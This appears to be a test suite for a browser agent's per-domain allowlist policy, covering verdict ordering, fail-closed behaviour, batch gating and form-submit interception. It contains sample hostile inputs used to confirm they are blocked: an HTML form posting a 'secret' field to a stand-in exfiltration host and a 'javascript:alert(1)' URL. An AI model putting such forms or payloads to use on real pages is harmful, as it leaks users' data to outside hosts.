/**
 * Per-domain browser command policy tests (issue #19882). Deterministic and
 * real: the actual policy registry, the real BrowserService dispatcher, and
 * the real JSDOM workspace form-submit path are exercised — no mock stands in
 * for the system under test. Covers allow/block/require_confirmation verdicts,
 * fail-closed evaluation for throwing and malformed policies, unknown-domain
 * fail-closed behavior, nested batch step gating, and submit interception at
 * the resolved submit URL.
 */

import { afterEach, describe, expect, it, vi } from "vitest";
import {
  type BrowserDomainPolicy,
  browserDomainPolicyRequestForCommand,
  classifyBrowserCommandEffect,
  createBrowserDomainAllowlistPolicy,
  evaluateBrowserDomainPolicies,
  listBrowserDomainPolicies,
  registerBrowserDomainPolicy,
  unregisterBrowserDomainPolicy,
} from "../browser-domain-policy.js";
import { BrowserService, type BrowserTarget } from "../browser-service.js";

function clearRegisteredPolicies(): void {
  for (const policy of listBrowserDomainPolicies()) {
    unregisterBrowserDomainPolicy(policy.id);
  }
}

function createTarget(id: string): BrowserTarget & {
  execute: ReturnType<typeof vi.fn>;
} {
  const execute = vi.fn(async (command: { subaction: string }) => ({
    mode: "web" as const,
    subaction: command.subaction as never,
    value: id,
  }));
  return {
    id,
    name: id,
    description: id,
    priority: 100,
    available: async () => true,
    execute: execute as never,
  } as BrowserTarget & { execute: ReturnType<typeof vi.fn> };
}

afterEach(() => {
  clearRegisteredPolicies();
});

describe("classifyBrowserCommandEffect", () => {
  it("classifies known subactions into their effect classes", () => {
    expect(classifyBrowserCommandEffect("eval")).toBe("eval");
    expect(classifyBrowserCommandEffect("upload")).toBe("upload");
    expect(classifyBrowserCommandEffect("realistic-upload")).toBe("upload");
    expect(classifyBrowserCommandEffect("navigate")).toBe("navigate");
    expect(classifyBrowserCommandEffect("open")).toBe("navigate");
    expect(classifyBrowserCommandEffect("reload")).toBe("navigate");
    expect(classifyBrowserCommandEffect("snapshot")).toBe("read");
    expect(classifyBrowserCommandEffect("state")).toBe("read");
    expect(classifyBrowserCommandEffect("click")).toBe("interact");
    expect(classifyBrowserCommandEffect("fill")).toBe("interact");
  });

  it("treats unknown subactions as interact, never read", () => {
    expect(classifyBrowserCommandEffect("some-future-mutation")).toBe(
      "interact",
    );
  });
});

describe("evaluateBrowserDomainPolicies", () => {
  const request = {
    subaction: "navigate",
    effect: "navigate" as const,
    domain: "example.com",
    url: "https://example.com/a",
    targetId: null,
    phase: "dispatch" as const,
  };

  it("allows when no policies are registered", () => {
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("allow");
  });

  it("returns the first non-allow decision in registration order", () => {
    registerBrowserDomainPolicy({
      id: "first-allow",
      evaluate: () => ({
        verdict: "allow",
        reason: "ok",
        policyId: "first-allow",
      }),
    });
    registerBrowserDomainPolicy({
      id: "second-block",
      evaluate: () => ({
        verdict: "block",
        reason: "no",
        policyId: "second-block",
      }),
    });
    registerBrowserDomainPolicy({
      id: "third-confirm",
      evaluate: () => ({
        verdict: "require_confirmation",
        reason: "later",
        policyId: "third-confirm",
      }),
    });
    const decision = evaluateBrowserDomainPolicies(request);
    expect(decision.verdict).toBe("block");
    expect(decision.policyId).toBe("second-block");
  });

  it("fails closed when a policy throws", () => {
    registerBrowserDomainPolicy({
      id: "exploding",
      evaluate: () => {
        throw new Error("boom");
      },
    });
    const decision = evaluateBrowserDomainPolicies(request);
    expect(decision.verdict).toBe("block");
    expect(decision.reason).toContain("boom");
    expect(decision.policyId).toBe("exploding");
  });

  it("fails closed when a policy returns an unrecognized verdict", () => {
    registerBrowserDomainPolicy({
      id: "malformed",
      evaluate: () => ({ verdict: "maybe", reason: "?" }) as never,
    });
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("block");
  });

  it("rejects registration without an id and replaces by id", () => {
    expect(() =>
      registerBrowserDomainPolicy({
        id: "  ",
        evaluate: () => ({ verdict: "allow", reason: "", policyId: "" }),
      }),
    ).toThrow(/non-empty id/);
    const block: BrowserDomainPolicy = {
      id: "dup",
      evaluate: () => ({ verdict: "block", reason: "v1", policyId: "dup" }),
    };
    registerBrowserDomainPolicy(block);
    registerBrowserDomainPolicy({
      id: "dup",
      evaluate: () => ({ verdict: "allow", reason: "v2", policyId: "dup" }),
    });
    expect(listBrowserDomainPolicies()).toHaveLength(1);
    expect(evaluateBrowserDomainPolicies(request).verdict).toBe("allow");
  });
});

describe("createBrowserDomainAllowlistPolicy", () => {
  const policy = createBrowserDomainAllowlistPolicy({
    id: "allowlist",
    allowedDomains: ["Example.COM."],
  });
  const base = {
    subaction: "navigate",
    effect: "navigate" as const,
    url: null,
    targetId: null,
    phase: "dispatch" as const,
  };

  it("allows exact and subdomain matches after normalization", () => {
    expect(policy.evaluate({ ...base, domain: "example.com" }).verdict).toBe(
      "allow",
    );
    expect(
      policy.evaluate({ ...base, domain: "login.example.com" }).verdict,
    ).toBe("allow");
  });

  it("blocks non-matching and suffix-spoofed domains", () => {
    expect(policy.evaluate({ ...base, domain: "evil.com" }).verdict).toBe(
      "block",
    );
    expect(policy.evaluate({ ...base, domain: "notexample.com" }).verdict).toBe(
      "block",
    );
  });

  it("fails closed on an unresolvable domain for gated effects", () => {
    expect(policy.evaluate({ ...base, domain: null }).verdict).toBe("block");
  });

  it("allows ungated effects regardless of domain", () => {
    expect(
      policy.evaluate({
        ...base,
        effect: "read",
        subaction: "snapshot",
        domain: null,
      }).verdict,
    ).toBe("allow");
  });

  it("supports require_confirmation verdicts", () => {
    const confirming = createBrowserDomainAllowlistPolicy({
      id: "confirming",
      allowedDomains: ["example.com"],
      deniedVerdict: "require_confirmation",
      unknownDomainVerdict: "require_confirmation",
    });
    expect(confirming.evaluate({ ...base, domain: "evil.com" }).verdict).toBe(
      "require_confirmation",
    );
    expect(confirming.evaluate({ ...base, domain: null }).verdict).toBe(
      "require_confirmation",
    );
  });

  it("rejects an effectively empty allowlist", () => {
    expect(() =>
      createBrowserDomainAllowlistPolicy({
        id: "empty",
        allowedDomains: ["   ", "..."],
      }),
    ).toThrow(/at least one valid domain/);
  });
});

describe("browserDomainPolicyRequestForCommand", () => {
  it("derives the domain from a navigation URL", () => {
    const request = browserDomainPolicyRequestForCommand(
      { subaction: "navigate", url: "https://Sub.Example.com/path" },
      "workspace",
    );
    expect(request).toMatchObject({
      subaction: "navigate",
      effect: "navigate",
      domain: "sub.example.com",
      targetId: "workspace",
      phase: "dispatch",
    });
  });

  it("yields a null domain for commands without a URL and non-http URLs", () => {
    expect(
      browserDomainPolicyRequestForCommand({ subaction: "click" }, null).domain,
    ).toBeNull();
    expect(
      browserDomainPolicyRequestForCommand(
        { subaction: "navigate", url: "javascript:alert(1)" },
        null,
      ).domain,
    ).toBeNull();
  });
});

describe("BrowserService dispatch gating", () => {
  it("blocks a gated navigation before any target executes", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "dispatch-allowlist",
        allowedDomains: ["example.com"],
      }),
    );
    const service = new BrowserService();
    const target = createTarget("workspace");
    service.registerTarget(target);

    await expect(
      service.execute({ subaction: "navigate", url: "https://evil.com/" }),
    ).rejects.toMatchObject({
      name: "BrowserDispatchFailure",
      kind: "POLICY_BLOCKED",
    });
    expect(target.execute).not.toHaveBeenCalled();

    const allowed = await service.execute({
      subaction: "navigate",
      url: "https://example.com/",
    });
    expect(allowed.value).toBe("workspace");
  });

  it("gates nested batch steps individually", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "batch-allowlist",
        allowedDomains: ["example.com"],
      }),
    );
    const service = new BrowserService();
    const target = createTarget("workspace");
    service.registerTarget(target);

    await expect(
      service.execute({
        subaction: "batch",
        steps: [
          { subaction: "snapshot" },
          {
            subaction: "batch",
            steps: [{ subaction: "open", url: "https://evil.com/login" }],
          },
        ],
      }),
    ).rejects.toMatchObject({ kind: "POLICY_BLOCKED" });
    expect(target.execute).not.toHaveBeenCalled();
  });

  it("surfaces require_confirmation as a distinct POLICY_BLOCKED message", async () => {
    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "confirm-allowlist",
        allowedDomains: ["example.com"],
        deniedVerdict: "require_confirmation",
      }),
    );
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));

    await expect(
      service.execute({ subaction: "navigate", url: "https://evil.com/" }),
    ).rejects.toThrow(/requires explicit confirmation/);
  });

  it("keeps dispatch unaffected when no policies are registered", async () => {
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));
    const result = await service.execute({
      subaction: "navigate",
      url: "https://anywhere.example.net/",
    });
    expect(result.value).toBe("workspace");
  });

  it("still hard-blocks generic eval regardless of an allow-everything policy", async () => {
    registerBrowserDomainPolicy({
      id: "allow-everything",
      evaluate: () => ({
        verdict: "allow",
        reason: "yes",
        policyId: "allow-everything",
      }),
    });
    const service = new BrowserService();
    service.registerTarget(createTarget("workspace"));
    await expect(
      service.execute({ subaction: "eval" } as never),
    ).rejects.toMatchObject({ kind: "POLICY_BLOCKED" });
  });
});

describe("workspace form submit interception", () => {
  const formHtml = `<!doctype html><html><head><title>Form</title></head><body>
    <form action="https://exfil.evil.test/collect" method="post">
      <input id="q" name="q" value="secret" />
      <button id="go" type="submit">Go</button>
    </form></body></html>`;
  const webEnv: NodeJS.ProcessEnv = {};

  it("blocks a JSDOM form submit whose resolved action leaves the allowlist", async () => {
    const {
      __resetBrowserWorkspaceStateForTests,
      executeBrowserWorkspaceCommand,
      openBrowserWorkspaceTab,
    } = await import("../workspace/browser-workspace.js");
    await __resetBrowserWorkspaceStateForTests();
    const tab = await openBrowserWorkspaceTab(
      { show: true, url: "about:blank" },
      webEnv,
    );
    await executeBrowserWorkspaceCommand(
      {
        id: tab.id,
        networkAction: "route",
        responseBody: formHtml,
        subaction: "network",
        url: "https://shop.test/",
      },
      webEnv,
    );
    await executeBrowserWorkspaceCommand(
      { id: tab.id, subaction: "navigate", url: "https://shop.test/" },
      webEnv,
    );

    registerBrowserDomainPolicy(
      createBrowserDomainAllowlistPolicy({
        id: "submit-allowlist",
        allowedDomains: ["shop.test"],
        gatedEffects: ["submit"],
      }),
    );
    try {
      await expect(
        executeBrowserWorkspaceCommand(
          { id: tab.id, selector: "#go", subaction: "click" },
          webEnv,
        ),
      ).rejects.toThrow(/domain policy "submit-allowlist"/);
    } finally {
      await __resetBrowserWorkspaceStateForTests();
    }
  });
});
